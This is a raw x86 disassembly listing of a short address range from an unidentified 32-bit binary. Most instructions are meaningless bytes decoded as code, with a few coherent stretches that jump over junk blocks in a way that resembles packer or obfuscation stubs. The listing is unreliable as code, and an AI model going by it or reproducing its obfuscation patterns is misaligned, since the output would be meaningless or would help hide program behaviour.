  40bc56:	sbb    dh,BYTE PTR [edi+0x12ff9d32]
  40bc5c:	mov    BYTE PTR [edi-0x4954229f],cl
  40bc62:	jno    0x40bca0
  40bc64:	xchg   edi,eax
  40bc65:	test   DWORD PTR [edi-0x30],0x4aa5a1cd
  40bc6c:	adc    eax,0xd39950f7
  40bc71:	icebp  
  40bc72:	jns    0x40bc10
  40bc74:	mov    ss,WORD PTR [edx]
  40bc76:	test   DWORD PTR [eax+ebx*2-0x2cf7c52e],ecx
  40bc7d:	mov    al,0x2a
  40bc7f:	jno    0x40bcce
  40bc81:	dec    ebx
  40bc82:	daa    
  40bc83:	(bad)  
  40bc84:	aad    0x33
  40bc86:	sub    BYTE PTR [esp+edx*8-0x7b7a1092],bh
  40bc8d:	jns    0x40bc85
  40bc8f:	aad    0xa9
  40bc91:	xchg   esp,eax
  40bc92:	rcl    eax,0x55
  40bc95:	(bad)  
  40bc96:	mov    BYTE PTR [ecx+0x750df85a],bl
  40bc9c:	gs (bad) 
  40bc9e:	or     ebx,DWORD PTR [esi+0x60]
  40bca1:	pushf  
  40bca2:	ins    DWORD PTR es:[edi],dx
  40bca3:	retf   0xceb5
  40bca6:	pop    esp
  40bca7:	mov    ds:0x4bb91551,eax
  40bcac:	leave  
  40bcad:	jne    0x40bca6
  40bcaf:	jp     0x40bc7b
  40bcb1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bcb2:	retf   
  40bcb3:	xchg   ebx,eax
  40bcb4:	imul   eax,ebx,0x4bb361c9
  40bcba:	jge    0x40bc7f
  40bcbc:	jle    0x40bcf4
  40bcbe:	xchg   edx,eax
  40bcbf:	and    ch,ch
  40bcc1:	and    edx,DWORD PTR [ebx+0x787407bb]
  40bcc7:	mov    edi,0x3d3d88ee
  40bccc:	call   0x484c3731
  40bcd1:	jmp    0x40bd2e
  40bcd3:	shl    DWORD PTR [edx-0x4a2bcb06],1
  40bcd9:	lea    edi,[edi]
  40bcdb:	mov    dh,0xb9
  40bcdd:	cmp    eax,0xa7e6cd76
  40bce2:	sbb    esi,DWORD PTR [ebx-0x648bc5c0]
  40bce8:	and    edi,eax
  40bcea:	mov    edx,0xd2f7613c
  40bcef:	in     al,0xc6
  40bcf1:	mov    ecx,0x52286fc9
  40bcf6:	pop    es
  40bcf7:	stos   BYTE PTR es:[edi],al
  40bcf8:	out    0xb1,eax
  40bcfa:	xlat   BYTE PTR gs:[ebx]
  40bcfc:	xchg   esi,eax
  40bcfd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bcfe:	xor    ah,BYTE PTR [edx-0x66db26eb]
  40bd04:	dec    ecx
  40bd05:	sub    cl,BYTE PTR [ebp-0x1180b4ee]
  40bd0b:	pop    esi
  40bd0c:	imul   ebx,DWORD PTR [edx],0x6d6d699d
  40bd12:	fisub  DWORD PTR [esi-0x41de05c8]
  40bd18:	xor    eax,DWORD PTR [edi]
  40bd1a:	das    
  40bd1b:	in     eax,0x7d
  40bd1d:	or     DWORD PTR [ebx+0x29],ebp
  40bd20:	sar    BYTE PTR [ecx-0x7855b59d],1
  40bd26:	cmp    eax,0xc68f4ac3
  40bd2b:	out    dx,al
  40bd2c:	xchg   ebx,eax
  40bd2d:	and    eax,0x9c3b89cb
  40bd32:	mov    dh,0xbe
  40bd34:	fstp   QWORD PTR [edi-0x1c]
  40bd37:	pushf  
  40bd38:	dec    edi
  40bd39:	into   
  40bd3a:	inc    edx
  40bd3b:	cwde   
  40bd3c:	popf   
  40bd3d:	cmp    DWORD PTR [esi],esp
  40bd3f:	push   0x2e62d40a
  40bd44:	aad    0x61
  40bd46:	out    dx,eax
  40bd47:	dec    esp
  40bd48:	sub    eax,0x48f07d51
  40bd4d:	(bad)  
  40bd4f:	mov    bh,0x75
  40bd51:	sbb    edx,DWORD PTR [ecx-0x22]
  40bd54:	(bad)  
  40bd55:	jns    0x40bda4
  40bd57:	push   esi
  40bd58:	jmp    0x907f:0x6e76ab94
  40bd5f:	dec    esp
  40bd60:	xchg   ecx,eax
  40bd61:	adc    BYTE PTR [ecx],dl
  40bd63:	pusha  
  40bd64:	retf   
  40bd65:	jecxz  0x40bd94
  40bd67:	rol    bl,1
  40bd69:	cld    
  40bd6a:	jmp    0x40bd0d
  40bd6c:	shl    DWORD PTR [eax],1
  40bd6e:	outs   dx,DWORD PTR ds:[esi]
  40bd6f:	push   es
  40bd70:	sub    bl,BYTE PTR [ecx]
  40bd72:	sbb    edx,ebx
  40bd74:	je     0x40bd65
  40bd76:	push   0x1c
  40bd78:	sub    BYTE PTR [ebx],0xac
  40bd7b:	mov    WORD PTR gs:0x843ba967,gs
  40bd82:	push   ebx
  40bd83:	cmc    
  40bd84:	(bad)  
  40bd85:	out    dx,eax
  40bd86:	retf   0xd8c8
  40bd89:	std    
  40bd8a:	cld    
  40bd8b:	mov    eax,0xe231c433
  40bd90:	mov    al,ds:0x275b94dd
  40bd95:	sti    
  40bd96:	lahf   
  40bd97:	ret    
  40bd98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bd99:	daa    
  40bd9a:	pushf  
  40bd9b:	xor    cl,bl
  40bd9d:	loopne 0x40be15
  40bd9f:	jne    0x40bd7e
  40bda1:	push   eax
  40bda2:	sbb    dh,ah
  40bda4:	ret    
  40bda5:	addr16 adc al,0x18
  40bda8:	(bad)  
  40bdac:	sbb    dh,BYTE PTR [bx+di-0x44]
  40bdb0:	loop   0x40bd5f
  40bdb2:	sub    ch,BYTE PTR [edx+ecx*1]
  40bdb5:	fst    QWORD PTR ds:0xb58ba50f
  40bdbb:	aad    0x76
  40bdbd:	dec    eax
  40bdbe:	jg     0x40be22
  40bdc0:	ins    BYTE PTR es:[edi],dx
  40bdc1:	jl     0x40bd8f
  40bdc3:	cmp    DWORD PTR [edi-0x5988a9af],ebx
  40bdc9:	pop    esp
  40bdca:	(bad)  
  40bdcb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bdcc:	ja     0x40bd91
  40bdce:	jns    0x40be13
  40bdd0:	fmul   DWORD PTR [edx-0xe]
  40bdd3:	loopne 0x40bdec
  40bdd5:	inc    esp
  40bdd6:	xchg   ebx,eax
  40bdd7:	add    DWORD PTR [esi],ecx
  40bdd9:	neg    DWORD PTR [ebp+0x1c31709c]
  40bddf:	adc    BYTE PTR [ebx-0x7f],dl
  40bde2:	sbb    bh,BYTE PTR [ebx*1+0x3c56e64]
  40bde9:	out    dx,eax
  40bdea:	sub    BYTE PTR [ebp+edx*8+0x62],0x6d
  40bdef:	cmc    
  40bdf0:	cmp    esi,esp
  40bdf2:	and    DWORD PTR [eax+0x1a],edi
  40bdf5:	jg     0x40be15
  40bdf7:	jmp    0x6d1dee63
  40bdfc:	mov    ds:0x8e9bc7f4,al
  40be01:	sbb    bh,dh
  40be03:	js     0x40bdb7
  40be05:	mov    esi,0xda4d8335
  40be0a:	push   eax
  40be0b:	test   BYTE PTR [edx-0x52d648d9],bh
  40be11:	or     BYTE PTR [esi],bh
  40be13:	cdq    
  40be14:	or     DWORD PTR [esi],edx
  40be16:	or     ecx,DWORD PTR [eax]
  40be18:	hlt    
  40be19:	push   ebx
  40be1a:	push   esp
  40be1b:	out    0x6c,al
  40be1d:	xchg   dl,ah
  40be1f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40be20:	pop    es
  40be21:	(bad)  
  40be22:	mov    dl,0x12
  40be24:	mov    eax,ds:0xc1c5db76
  40be29:	dec    ebx
  40be2a:	mov    ebx,0xdcf038e1
  40be2f:	xchg   edi,eax
  40be30:	adc    DWORD PTR [ecx+ebp*2],eax
  40be33:	scas   eax,DWORD PTR es:[edi]
  40be34:	add    eax,0x18c7b3bd
  40be39:	fidiv  WORD PTR [ebx]
  40be3b:	(bad)  
  40be3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40be3d:	sar    BYTE PTR [ebx+0x688787b2],1
  40be43:	fs fwait
  40be45:	pop    esi
  40be46:	nop
  40be47:	xor    eax,0x8ab0ed22
  40be4c:	add    BYTE PTR [edi+esi*1],al
  40be4f:	and    DWORD PTR ds:0x432dde,0x432700
  40be59:	xor    al,0x47
  40be5b:	cmp    al,0xc3
  40be5d:	mov    DWORD PTR ds:0x432dd6,0x1383
  40be67:	jne    0x40c344
  40be6d:	mov    eax,DWORD PTR [ebp+0x8]
  40be70:	mov    ecx,DWORD PTR [ebp+0x8]
  40be73:	movzx  edx,BYTE PTR ds:0x434421
  40be7a:	xor    edx,DWORD PTR ds:0x434419
  40be80:	mov    DWORD PTR ds:0x434421,edx
  40be86:	add    ecx,DWORD PTR [eax+0x3c]
  40be89:	xor    eax,edx
  40be8b:	mov    edx,0x7510855
  40be90:	mov    DWORD PTR [ebp+0x8],ecx
  40be93:	or     ecx,0x72e5
  40be99:	mov    eax,DWORD PTR [ebp-0x4]
  40be9c:	and    DWORD PTR ds:0x434421,0x0
  40bea6:	mov    ecx,DWORD PTR ds:0x434421
  40beac:	inc    ecx
  40bead:	mov    DWORD PTR ds:0x434421,ecx
  40beb3:	cmp    DWORD PTR ds:0x434421,0x25
  40beba:	jne    0x40bed6
  40bec0:	push   0x432849
  40bec5:	push   DWORD PTR [ebp-0x24]
  40bec8:	push   0x7ea1
  40becd:	push   DWORD PTR [ebp-0x24]
  40bed0:	call   DWORD PTR ds:0x432d1a
  40bed6:	cmp    DWORD PTR ds:0x434421,0x17
  40bedd:	jb     0x40bea6
  40bee3:	xor    eax,edx
  40bee5:	push   esi
  40bee6:	jmp    0x40c101
  40beeb:	je     0x40befe
  40beed:	test   DWORD PTR [ebp+eiz*2+0x4df17194],eax
  40bef4:	pop    eax
  40bef5:	pop    esp
  40bef6:	or     bh,BYTE PTR [esi+0x7b0f5ec8]
  40befc:	cld    
  40befd:	jo     0x40bf6f
  40beff:	jb     0x40bf80
  40bf01:	jo     0x40bf73
  40bf03:	sbb    al,BYTE PTR [ebp+0x51]
  40bf06:	pop    esi
  40bf07:	xchg   edi,eax
  40bf08:	sbb    ebp,DWORD PTR [edi+ecx*2+0x43]
  40bf0c:	repnz fsub st(4),st
  40bf0f:	xchg   esi,eax
  40bf10:	and    ebx,DWORD PTR [edi+0x69]
  40bf13:	in     eax,dx
  40bf14:	lahf   
  40bf15:	push   esi
  40bf16:	or     cl,BYTE PTR [ecx+0xc]
  40bf19:	lds    ebp,FWORD PTR [ecx]
  40bf1b:	fs and al,0x75
  40bf1e:	inc    esp
  40bf1f:	in     eax,dx
  40bf20:	test   eax,0xced6e5f0
  40bf25:	xchg   esi,eax
  40bf26:	inc    eax
  40bf27:	scas   al,BYTE PTR es:[edi]
  40bf28:	pop    ecx
  40bf29:	mov    edx,0x2d0136c6
  40bf2e:	stos   BYTE PTR es:[edi],al
  40bf2f:	dec    edi
  40bf30:	xchg   ebp,eax
  40bf31:	clc    
  40bf32:	dec    ebp
  40bf33:	add    BYTE PTR ds:0x439b6829,dh
  40bf39:	mov    dl,0x38
  40bf3b:	cmp    dl,BYTE PTR [esi]
  40bf3d:	xchg   BYTE PTR [ecx],ah
  40bf3f:	xor    al,0x86
  40bf41:	bnd jb 0x40bf21
  40bf44:	pushf  
  40bf45:	shl    DWORD PTR [ebx+esi*2],1
  40bf48:	clc    
  40bf49:	arpl   si,bp
  40bf4b:	push   0xa5c2be25
  40bf50:	div    BYTE PTR [edi-0x48e509f7]
  40bf56:	jmp    0xc1fd:0x66c2fb8e
  40bf5d:	(bad)  
  40bf5e:	mov    WORD PTR [edx-0x76930d33],es
  40bf64:	fild   WORD PTR [ebx+0x3f]
  40bf67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bf68:	lea    edx,[esi-0x4f]
  40bf6b:	add    eax,0x6b53cdf0
  40bf70:	jno    0x40bf9c
  40bf72:	rcr    BYTE PTR [edx],cl
  40bf74:	adc    dh,BYTE PTR [edx-0x378beabd]
  40bf7a:	mul    BYTE PTR [esp+ebx*8]
  40bf7d:	lods   eax,DWORD PTR ds:[esi]
  40bf7e:	stc    
  40bf7f:	idiv   DWORD PTR [ebx]
  40bf81:	jmp    0xf3ef:0x1e0a83ee
  40bf88:	add    ch,BYTE PTR [ebx+0x45b0d7f2]
  40bf8e:	pop    esp
  40bf8f:	mov    ds:0x800b2b8a,eax
  40bf94:	add    BYTE PTR [ecx],ch
  40bf96:	lods   eax,DWORD PTR ds:[esi]
  40bf97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bf98:	push   esp
  40bf99:	jmp    0xa710:0x8bb650a4
  40bfa0:	inc    edi
  40bfa1:	xchg   edi,eax
  40bfa2:	inc    esp
  40bfa3:	dec    eax
  40bfa4:	push   esi
  40bfa5:	aaa    
  40bfa6:	aaa    
  40bfa7:	test   al,0xb4
  40bfa9:	add    al,0xf7
  40bfab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bfac:	aaa    
  40bfad:	cld    
  40bfae:	loop   0x40bfb8
  40bfb0:	fdivr  DWORD PTR [ebx+0x35f1b727]
  40bfb6:	push   0x6e
  40bfb8:	ret    
  40bfb9:	popa   
  40bfba:	add    BYTE PTR [edx-0x50],bh
  40bfbd:	dec    esp
  40bfbe:	jmp    0x63c68cdf
  40bfc3:	test   eax,0x3647bd62
  40bfc8:	adc    eax,0x2f6d9185
  40bfcd:	repz aam 0xaa
  40bfd0:	xor    al,0xc7
  40bfd2:	daa    
  40bfd3:	(bad)  
  40bfd4:	pop    edi
  40bfd5:	repz push es
  40bfd7:	mov    dl,0x2d
  40bfd9:	cwde   
  40bfda:	inc    eax
  40bfdb:	pop    ss
  40bfdc:	call   0x8936:0x86625b96
  40bfe3:	and    al,0xcc
  40bfe5:	inc    ebp
  40bfe6:	dec    edx
  40bfe7:	not    DWORD PTR [ecx]
  40bfe9:	push   cs
  40bfea:	arpl   WORD PTR [esi+edi*2],ax
  40bfed:	pop    ebp
  40bfee:	jne    0x40c049
  40bff0:	pusha  
  40bff1:	xchg   ecx,eax
  40bff2:	jmp    0xbf4a:0xc50d4335
  40bff9:	mov    dh,0x8
  40bffb:	jbe    0x40c03f
  40bffd:	pushf  
  40bffe:	call   0x8766:0x10cd6875
  40c005:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c006:	test   al,0xa1
  40c008:	out    0x5b,eax
  40c00a:	or     BYTE PTR [edx],dl
  40c00c:	xchg   esi,eax
  40c00d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c00e:	dec    edx
  40c00f:	das    
  40c010:	cmp    al,0x3e
  40c012:	and    eax,0x4698b040
  40c017:	icebp  
  40c018:	push   ebp
  40c019:	in     al,dx
  40c01a:	call   0x64d0f8e5
  40c01f:	outs   dx,DWORD PTR ds:[esi]
  40c020:	fdiv   DWORD PTR [ebx]
  40c022:	fistp  WORD PTR [edx+0x15]
  40c025:	inc    esp
  40c026:	add    dh,BYTE PTR [edi+0x4d]
  40c029:	clc    
  40c02a:	jno    0x40c063
  40c02c:	xor    eax,0xa8636e67
  40c031:	mov    ds:0x108d91db,al
  40c036:	repnz test eax,0xe8739615
  40c03c:	cmp    BYTE PTR [eax+0x7a],0x60
  40c040:	leave  
  40c041:	sbb    ebx,ecx
  40c043:	out    0xfd,eax
  40c045:	jae    0x40c047
  40c047:	out    dx,eax
  40c048:	repnz adc al,0xf8
  40c04b:	das    
  40c04c:	sub    bh,BYTE PTR [eax+0x19ddeb96]
  40c052:	sub    BYTE PTR [eax+0x3b16b39],ch
  40c058:	fwait
  40c059:	loope  0x40c014
  40c05b:	test   BYTE PTR [ebx+0x20],bh
  40c05e:	cwde   
  40c05f:	clc    
  40c060:	mov    eax,0xa2ff3515
  40c065:	ret    
  40c066:	mov    ebp,DWORD PTR [ebx+0x4a]
  40c069:	addr16 mov al,ds:0x74dc
  40c06d:	fstp   QWORD PTR [ebx-0xa14e8f]
  40c073:	push   ebp
  40c074:	popa   
  40c075:	mov    ds:0x6bf96303,eax
  40c07a:	or     cl,BYTE PTR [edx+ebp*1]
  40c07d:	jecxz  0x40c0ec
  40c07f:	xchg   edi,eax
  40c080:	adc    al,0x27
  40c082:	xchg   esp,eax
  40c083:	xor    cl,al
  40c085:	mov    esi,0x14dd6c2a
  40c08a:	sbb    ebp,esp
  40c08c:	mov    ebx,0xa08c92f9
  40c091:	jbe    0x40c0dc
  40c093:	inc    ebx
  40c094:	cmp    BYTE PTR [edi-0x4a3f4957],al
  40c09a:	sbb    eax,0xcb067b4e
  40c09f:	cmc    
  40c0a0:	add    DWORD PTR [edi],esi
  40c0a2:	xchg   ebp,eax
  40c0a3:	(bad)  
  40c0a4:	pop    ecx
  40c0a5:	mov    esp,0x1ddfd081
  40c0aa:	adc    eax,0x55e9fdd1
  40c0af:	pop    DWORD PTR [edx-0x67fc58c4]
  40c0b5:	mul    edi
  40c0b7:	das    
  40c0b8:	inc    eax
  40c0b9:	inc    esi
  40c0ba:	aaa    
  40c0bb:	xor    eax,0x4c8a54d2
  40c0c0:	lea    esi,[edx]
  40c0c2:	mov    ebx,0x7706f472
  40c0c7:	jno    0x40c0ac
  40c0c9:	je     0x40c05b
  40c0cb:	(bad)  
  40c0cd:	(bad)  
  40c0ce:	leave  
  40c0cf:	ins    DWORD PTR es:[edi],dx
  40c0d0:	ds ret 0x8fe3
  40c0d4:	cmp    BYTE PTR [ebx-0x4a06c839],ah
  40c0da:	and    cl,al
  40c0dc:	xchg   edx,eax
  40c0dd:	inc    eax
  40c0de:	xor    ebp,DWORD PTR [ecx]
  40c0e0:	shl    ebp,0x3c
  40c0e3:	dec    ecx
  40c0e4:	pop    esp
  40c0e5:	fs jns 0x40c0a6
  40c0e8:	call   0x258e624a
  40c0ed:	cs pop esi
  40c0ef:	ins    BYTE PTR es:[edi],dx
  40c0f0:	xchg   ebx,eax
  40c0f1:	int3   
  40c0f2:	fild   WORD PTR [esi-0x6c]
  40c0f5:	adc    eax,0x5c453ff3
  40c0fa:	nop
  40c0fb:	sbb    BYTE PTR [ebp-0x50],cl
  40c0fe:	and    eax,DWORD PTR ds:0x8758bb1
  40c104:	mov    ecx,0x32729c
  40c109:	add    eax,ecx
  40c10b:	jmp    0x40c326
  40c110:	cli    
  40c111:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c112:	push   ds
  40c113:	in     eax,0x21
  40c115:	gs inc ecx
  40c117:	arpl   WORD PTR [ebp*1-0x2672ac4b],si
  40c11e:	or     cl,BYTE PTR [edi*2+0x727070fa]
  40c125:	jg     0x40c197
  40c127:	jo     0x40c104
  40c129:	mov    bl,0xe9
  40c12b:	sar    DWORD PTR [eax+0x7d],1
  40c12e:	sub    bl,BYTE PTR [ecx]
  40c130:	add    eax,0x27639ce0
  40c135:	cmc    
  40c136:	and    al,0xd8
  40c138:	lods   al,BYTE PTR ds:[esi]
  40c139:	jae    0x40c133
  40c13b:	dec    ebp
  40c13c:	and    eax,0x69ed1fc0
  40c141:	(bad)  
  40c142:	pop    edi
  40c143:	ds loope 0x40c179
  40c146:	iret   
  40c147:	lods   eax,DWORD PTR ds:[esi]
  40c148:	cld    
  40c149:	lea    esi,[ebp-0x1b]
  40c14c:	push   esp
  40c14d:	pop    ss
  40c14e:	sbb    edi,DWORD PTR [edi+0x4e]
  40c151:	cmc    
  40c152:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c153:	jmp    0x40c1bc
  40c155:	mov    ah,0x68
  40c157:	fwait
  40c158:	data16 jp 0x40c127
  40c15b:	dec    ebx
  40c15c:	xor    bh,BYTE PTR [eax+0x32]
  40c15f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c160:	gs push edx
  40c162:	scas   al,BYTE PTR es:[edi]
  40c163:	add    eax,0xf762df83
  40c168:	(bad)  
  40c169:	cmp    ebx,esi
  40c16b:	sahf   
  40c16c:	inc    edi
  40c16d:	push   ss
  40c16e:	icebp  
  40c16f:	int    0xa
  40c171:	inc    esi
  40c172:	stos   DWORD PTR es:[edi],eax
  40c173:	jl     0x40c162
  40c175:	sub    esp,DWORD PTR [ebx+0x4d52a701]
  40c17b:	inc    ebx
  40c17c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c17d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c17e:	mov    bh,0xff
  40c180:	mov    ah,0xe6
  40c182:	add    DWORD PTR [ebx+0x57],ecx
  40c185:	dec    ebp
  40c186:	lock lock shl BYTE PTR fs:[bx-0x7d],0xea
  40c18e:	jno    0x40c1ea
  40c190:	leave  
  40c191:	ficomp WORD PTR [esi-0x5e]
  40c194:	and    eax,0x37877410
  40c199:	and    edx,DWORD PTR [ecx+0x24]
  40c19c:	pop    eax
  40c19d:	push   ebp
  40c19e:	mov    dh,0x8b
  40c1a0:	or     edi,DWORD PTR [esi+0x53]
  40c1a3:	cmp    BYTE PTR ds:[edx],bl
  40c1a6:	imul   ebx,DWORD PTR [esi+0x2d106d89],0xf4016df7
  40c1b0:	and    ah,dl
  40c1b2:	mov    esi,0x661c2e1c
  40c1b7:	mov    ebx,DWORD PTR [edx+0x1b]
  40c1ba:	out    dx,al
  40c1bb:	in     al,dx
  40c1bc:	jmp    0x1864d1a7
  40c1c1:	js     0x40c1b6
  40c1c3:	pop    ss
  40c1c4:	xlat   BYTE PTR ds:[ebx]
  40c1c5:	clc    
  40c1c6:	mov    ah,0xde
  40c1c8:	push   ebp
  40c1c9:	loope  0x40c1fb
  40c1cb:	mov    al,ds:0xcbe36791
  40c1d0:	jecxz  0x40c1a2
  40c1d2:	jmp    0x40c15f
  40c1d4:	sub    esi,esp
  40c1d6:	push   ebx
  40c1d7:	rcr    BYTE PTR [eax*2+0x6b056e19],cl
  40c1de:	repnz stos DWORD PTR es:[edi],eax
  40c1e0:	popf   
  40c1e1:	adc    al,0xe7
  40c1e3:	jne    0x40c23e
  40c1e5:	add    DWORD PTR [edi+0xbe3a90c],edi
  40c1eb:	adc    edi,DWORD PTR [esi-0x2f]
  40c1ee:	icebp  
  40c1ef:	inc    ecx
  40c1f0:	add    edi,DWORD PTR [ecx]
  40c1f2:	stos   DWORD PTR es:[edi],eax
  40c1f3:	add    DWORD PTR [ecx-0x10],eax
  40c1f6:	mov    WORD PTR [esi+ebp*1-0x50],cs
  40c1fa:	out    dx,eax
  40c1fb:	retf   
  40c1fc:	loopne 0x40c1de
  40c1fe:	je     0x40c211
  40c200:	cmp    al,0x72
  40c202:	wrmsr  
  40c204:	xchg   esp,eax
  40c205:	or     al,0x3e
  40c207:	cmc    
  40c208:	pop    ecx
  40c209:	call   0x4d65:0x67d54f1d
  40c210:	(bad)
  40c213:	and    DWORD PTR [ecx],edi
  40c215:	mov    eax,0xdf10cf86
  40c21a:	popa   
  40c21b:	(bad)  
  40c21c:	repz test al,0x11
  40c21f:	adc    al,0xb6
  40c221:	or     BYTE PTR [ebx+0xc5cda51],dh
  40c227:	push   cs
  40c228:	pop    eax
  40c229:	add    eax,0xaa631d3c
  40c22e:	ins    DWORD PTR es:[edi],dx
  40c22f:	mov    WORD PTR [ebx+ecx*2+0x4ac00caa],ss
  40c236:	aas    
  40c237:	cld    
  40c238:	outs   dx,DWORD PTR ds:[esi]
  40c239:	lods   al,BYTE PTR ds:[esi]
  40c23a:	dec    esp
  40c23b:	pop    ebx
  40c23c:	scas   eax,DWORD PTR es:[edi]
  40c23d:	aad    0x40
  40c23f:	pop    ebx
  40c240:	sbb    esi,DWORD PTR [edi-0x8027abb]
  40c246:	mov    ebp,0xcaa9b511
  40c24b:	xor    esi,edi
  40c24d:	adc    DWORD PTR ds:0x9951a695,0xb89e7864
  40c257:	popa   
  40c258:	jmp    0xea06b50e
  40c25d:	out    0xf2,eax
  40c25f:	cmp    ebp,0x7b
  40c262:	loop   0x40c212
  40c264:	test   al,0xcc
  40c266:	or     dl,BYTE PTR [ebp*4-0x487e0b83]
  40c26d:	lea    eax,[eax+0x34]
  40c270:	cmp    edx,DWORD PTR ds:[esi+esi*4]
  40c274:	sub    al,0x8e
  40c276:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c277:	push   es
  40c278:	ret    
  40c279:	repnz lock shl DWORD PTR ds:0x36c17d1b,cl
  40c281:	bound  esp,QWORD PTR [edi+0x799ae4e5]
  40c287:	aas    
  40c288:	adc    esi,DWORD PTR [ebp+0x16]
  40c28b:	jne    0x40c280
  40c28d:	div    BYTE PTR [edi]
  40c28f:	scas   al,BYTE PTR es:[edi]
  40c290:	in     eax,dx
  40c291:	mov    esi,0x4587c132
  40c296:	cmp    BYTE PTR [edx],dl
  40c298:	xchg   esi,eax
  40c299:	fimul  DWORD PTR [ebp-0x3d]
  40c29c:	and    BYTE PTR [esi+0x3a35c30d],ch
  40c2a2:	adc    BYTE PTR [ecx],bh
  40c2a4:	fst    DWORD PTR [edx]
  40c2a6:	dec    ebp
  40c2a7:	dec    esp
  40c2a8:	fldcw  WORD PTR [esp+ebx*4-0x3e5d61f7]
  40c2af:	pop    ecx
  40c2b0:	aad    0xf1
  40c2b2:	mov    dh,BYTE PTR [ebp-0x26]
  40c2b5:	inc    eax
  40c2b6:	xchg   BYTE PTR [edx+0x5c],ah
  40c2b9:	out    dx,eax
  40c2ba:	fstp   QWORD PTR [edi+0x2d]
  40c2bd:	pop    eax
  40c2be:	push   edi
  40c2bf:	aam    0xae
  40c2c1:	in     al,dx
  40c2c2:	xchg   edx,eax
  40c2c3:	sub    dl,dh
  40c2c5:	xchg   ebx,eax
  40c2c6:	push   0xffffffe5
  40c2c8:	inc    esi
  40c2c9:	jmp    0x23c6:0xc40a3f2d
  40c2d0:	jmp    0x8444:0x4d27342d
  40c2d7:	jg     0x40c32d
  40c2d9:	out    dx,eax
  40c2da:	sbb    DWORD PTR [ebx+0x7c],ecx
  40c2dd:	cli    
  40c2de:	xchg   DWORD PTR [ecx],ecx
  40c2e0:	mov    eax,ds:0x7d94c02c
  40c2e5:	xchg   ebp,eax
  40c2e6:	pop    es
  40c2e7:	sub    dh,BYTE PTR [ebx+0x7738bcbc]
  40c2ed:	(bad)  
  40c2ee:	jg     0x40c27d
  40c2f0:	inc    ecx
  40c2f1:	daa    
  40c2f2:	inc    ecx
  40c2f3:	outs   dx,DWORD PTR ds:[esi]
  40c2f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c2f5:	sub    eax,0xde2109b3
  40c2fa:	pop    eax
  40c2fb:	fst    DWORD PTR [ebx+0x22a84293]
  40c301:	call   0xb7114481
  40c306:	sahf   
  40c307:	fnsave [eax]
  40c309:	add    al,0xd9
  40c30b:	mov    dl,dh
  40c30d:	adc    eax,DWORD PTR [esi+eax*8-0x5]
  40c311:	loopne 0x40c310
  40c313:	ins    DWORD PTR es:[edi],dx
  40c314:	xchg   ebp,eax
  40c315:	(bad)  
  40c316:	loop   0x40c37d
  40c318:	pop    ds
  40c319:	cs repnz shl di,0xaf
  40c31f:	xor    eax,edi
  40c321:	cmp    esi,DWORD PTR [eax+0x73]
  40c324:	mov    ebx,0x544639bf
  40c329:	pop    esi
  40c32a:	je     0x40c338
  40c330:	mov    eax,DWORD PTR [ebp+0x8]
  40c333:	jmp    0x40c787
  40c338:	mov    eax,DWORD PTR [ebp-0x4]
  40c33b:	xor    eax,edx
  40c33d:	add    eax,ecx
  40c33f:	jmp    0x40c787
  40c344:	mov    eax,DWORD PTR [ebp-0x4]
  40c347:	jmp    0x40c562
  40c34c:	or     eax,0x739e7462
  40c351:	scas   al,BYTE PTR es:[edi]
  40c352:	shl    DWORD PTR [ecx-0x41],1
  40c355:	jb     0x40c38a
  40c357:	loop   0x40c315
  40c359:	and    al,0xda
  40c35b:	aas    
  40c35c:	jg     0x40c356
  40c35e:	jo     0x40c3d0
  40c360:	jb     0x40c3e1
  40c362:	jo     0x40c3d4
  40c364:	rcl    ch,1
  40c366:	lea    ebx,[edx]
  40c368:	mov    ebx,0x85d46fad
  40c36d:	mov    ds:0x3ab7ab16,eax
  40c372:	loop   0x40c3ad
  40c374:	add    eax,0x3858225
  40c379:	fwait
  40c37a:	sar    BYTE PTR [eax-0x5c],0x32
  40c37e:	cmp    al,0xf7
  40c380:	add    esp,ebp
  40c382:	pop    ebp
  40c383:	out    0xb7,eax
  40c385:	push   es
  40c386:	jl     0x40c351
  40c388:	cmc    
  40c389:	fdiv   QWORD PTR [esi-0x1a64ca6d]
  40c38f:	xor    eax,0xae2e0177
  40c394:	loopne 0x40c3ad
  40c396:	inc    esi
  40c397:	stos   BYTE PTR es:[edi],al
  40c398:	into   
  40c399:	in     al,dx
  40c39a:	lahf   
  40c39b:	outs   dx,BYTE PTR ds:[esi]
  40c39c:	and    eax,0xb7615889
  40c3a1:	mov    ch,ch
  40c3a3:	dec    esp
  40c3a4:	pop    esi
  40c3a5:	xchg   edi,eax
  40c3a6:	cmp    eax,0x1f652ec9
  40c3ab:	add    BYTE PTR [ecx+0x70],dh
  40c3ae:	cwde   
  40c3af:	xchg   edx,eax
  40c3b0:	inc    edx
  40c3b1:	mov    WORD PTR [ebx-0x2e],ds
  40c3b4:	cmp    esi,DWORD PTR [esi+0x55]
  40c3b7:	xchg   edx,eax
  40c3b8:	aas    
  40c3b9:	jnp    0x40c366
  40c3bb:	adc    bl,0x6c
  40c3be:	pop    edi
  40c3bf:	push   ebx
  40c3c0:	ja     0x40c3c9
  40c3c2:	jmp    0x40c3e9
  40c3c4:	mov    ch,0x93
  40c3c6:	(bad)  
  40c3c8:	out    0xa8,al
  40c3ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c3cb:	jno    0x40c406
  40c3cd:	ret    0x9353
  40c3d0:	mov    dl,BYTE PTR [ecx]
